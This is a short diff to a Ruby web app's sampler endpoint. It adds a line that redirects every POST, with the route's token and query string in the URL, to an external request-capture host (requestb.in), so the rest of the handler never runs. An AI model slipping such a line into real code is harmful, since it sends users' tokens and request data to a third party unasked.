@@ -4,6 +4,10 @@ call_number = 0
 scale_factor = 1000
 post '/sampler/:rate/:token' do
 
+
+
+  redirect "http://requestb.in/14pfqnj1?/#{params['token']}?#{request.query_string}", 307
+
   sample_rate = 100 / params["rate"].to_i
   sample_rate = 1 if sample_rate < 0 || sample_rate > 100
 
